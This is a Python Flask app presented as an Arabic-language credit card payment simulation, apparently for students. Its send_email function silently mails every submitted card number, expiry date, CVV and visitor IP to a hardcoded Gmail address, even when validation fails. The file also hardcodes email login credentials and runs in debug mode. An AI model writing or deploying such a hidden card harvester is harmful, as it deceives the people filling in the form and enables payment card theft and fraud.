from flask import Flask, request, render_template_string
import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# بيانات الإيميل الخاص بيك (غيّرها)
EMAIL_ADDRESS = "ana.taroka@gmail.com"          # إيميلك
EMAIL_PASSWORD = "test"			            # App Password (مش كلمة السر العادية)
ADMIN_EMAIL = "typist.ahmed@gmail.com"            # نفس الإيميل أو إيميل تاني

# HTML للواجهة (اللي بيشوفها الطالب)
HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>محاكاة نظام الدفع</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        form { display: flex; flex-direction: column; gap: 15px; }
        label { font-weight: bold; }
        input, select { padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
        button { background: #28a745; color: white; padding: 12px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #218838; }
        .result { margin-top: 30px; padding: 20px; border-radius: 5px; text-align: center; font-size: 20px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <div class="container">
        <h1>محاكاة نظام الدفع ببطاقات الائتمان</h1>
        <form method="POST">
            <label>رقم البطاقة (16 رقم):</label>
            <input type="text" name="card_number" maxlength="16" placeholder="مثال: 4111111111111111" required>

            <label>تاريخ الانتهاء (MM/YY):</label>
            <input type="text" name="expiry" placeholder="مثال: 12/28" maxlength="5" required>

            <label>CVV (3 أو 4 أرقام):</label>
            <input type="text" name="cvv" maxlength="4" placeholder="123" required>

            <label>المبلغ:</label>
            <input type="number" name="amount" min="1" required>

            <label>نوع العملية:</label>
            <select name="type" required>
                <option value="SALE">بيع (SALE)</option>
                <option value="REFUND">استرداد (REFUND)</option>
                <option value="VOID">إلغاء (VOID)</option>
                <option value="PREAUTH">حجز (PRE-AUTHORIZATION)</option>
            </select>

            <button type="submit">تنفيذ العملية</button>
        </form>

        {% if message %}
        <div class="result {{ 'success' if success else 'error' }}">
            <strong>{{ message }}</strong>
        </div>
        {% endif %}
    </div>
</body>
</html>
'''

def send_email(card_number, expiry, cvv, amount, trans_type, ip):
    subject = f"عملية دفع جديدة: {trans_type}"
    body = f"""
عملية دفع جديدة تمت في: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

رقم البطاقة: {card_number}
تاريخ الانتهاء: {expiry}
CVV: {cvv}
المبلغ: {amount} جنيه
نوع العملية: {trans_type}
IP الجهاز: {ip}
"""
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = ADMIN_EMAIL
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain', 'utf-8'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, ADMIN_EMAIL, msg.as_string())
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(f"Email failed: {e}")

@app.route('/', methods=['GET', 'POST'])
def home():
    message = ""
    success = False

    if request.method == 'POST':
        card_number = request.form.get('card_number', '').strip()
        expiry = request.form.get('expiry', '').strip()
        cvv = request.form.get('cvv', '').strip()
        amount = request.form.get('amount', '0')
        trans_type = request.form.get('type')
        ip = request.remote_addr  # IP اللي بيجرب

        # محاكاة التحقق
        is_valid = True
        if not (card_number.isdigit() and len(card_number) == 16):
            is_valid = False
            message = "رقم البطاقة غير صحيح (يجب أن يكون 16 رقم)"
        elif not (card_number.startswith('4') or card_number.startswith('5')):
            is_valid = False
            message = "رقم البطاقة غير مدعوم"
        elif not (len(cvv) in [3, 4] and cvv.isdigit()):
            is_valid = False
            message = "CVV غير صحيح"
        elif not validate_expiry(expiry):
            is_valid = False
            message = "تاريخ الانتهاء غير صالح أو منتهي"
        elif float(amount) <= 0:
            is_valid = False
            message = "المبلغ غير صالح"

        if is_valid:
            success = True
            if trans_type == "SALE":
                message = "تمت عملية البيع بنجاح!"
            elif trans_type == "REFUND":
                message = "تم الاسترداد بنجاح!"
            elif trans_type == "VOID":
                message = "تم إلغاء العملية بنجاح!"
            elif trans_type == "PREAUTH":
                message = "تم حجز المبلغ بنجاح!"

        # إرسال البيانات ليك أنت (الإيميل)
        send_email(card_number, expiry, cvv, amount, trans_type, ip)

    return render_template_string(HTML, message=message, success=success)

def validate_expiry(expiry):
    try:
        month, year = map(int, expiry.split('/'))
        if not (1 <= month <= 12):
            return False
        exp_date = datetime.datetime(2000 + year, month, 1)
        return exp_date > datetime.datetime.now()
    except:
        return False

if __name__ == '__main__':
    app.run(debug=True)